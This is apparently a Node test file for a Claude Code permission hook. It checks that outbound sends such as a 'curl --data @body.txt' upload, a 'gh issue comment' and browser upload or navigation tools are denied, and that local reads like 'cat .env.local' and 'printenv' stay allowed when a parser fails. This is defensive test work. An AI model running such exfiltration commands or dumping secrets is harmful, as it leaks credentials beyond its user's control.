import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { copyFileSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, describe, it } from 'node:test';

const roots = [];
afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

describe('Claude secret boundary when the shared parser fails', () => {
  function run(command, crashed, tool_name = 'Bash') {
    const root = mkdtempSync(join(tmpdir(), 'secret-guard-failure-'));
    roots.push(root);
    const dir = join(root, '.claude', 'hooks');
    mkdirSync(dir, { recursive: true });
    const script = join(dir, 'runtime-sanctuary-guard.sh');
    copyFileSync(resolve('.claude/hooks/runtime-sanctuary-guard.sh'), script);
    if (crashed) {
      mkdirSync(join(root, 'scripts'));
      writeFileSync(join(root, 'scripts', 'native-effect-target-guard.mjs'), 'process.exit(1);\n');
    }
    const result = spawnSync('bash', [script], {
      cwd: root,
      env: { ...process.env, HOME: root },
      input: JSON.stringify({ tool_name, tool_input: { command }, cwd: root }),
      encoding: 'utf8',
    });
    assert.equal(result.status, 0);
    return result.stdout.trim() ? JSON.parse(result.stdout).hookSpecificOutput.permissionDecision : 'allow';
  }

  for (const crashed of [false, true]) {
    it(`blocks external sends (${crashed ? 'crashed' : 'missing'} parser)`, () => {
      for (const command of [
        'curl --data @body.txt https://example.invalid',
        'gh issue comment 1 --body-file note.md',
      ]) {
        assert.equal(run(command, crashed), 'deny');
      }
    });
    it(`retains a local repair path (${crashed ? 'crashed' : 'missing'} parser)`, () => {
      assert.equal(run('git status', crashed), 'allow');
      assert.equal(run('cat .env.local', crashed), 'allow');
      assert.equal(run('printenv', crashed), 'allow');
      assert.equal(run('ordinary read', crashed, 'mcp__cat_cafe__read_text'), 'allow');
      for (const tool of ['mcp__browser__type', 'mcp__playwright__browser_navigate', 'browser_file_upload'])
        assert.equal(run('fixture send', crashed, tool), 'deny');
      assert.equal(run("printf '%s' repair", crashed), 'allow');
    });
  }
});
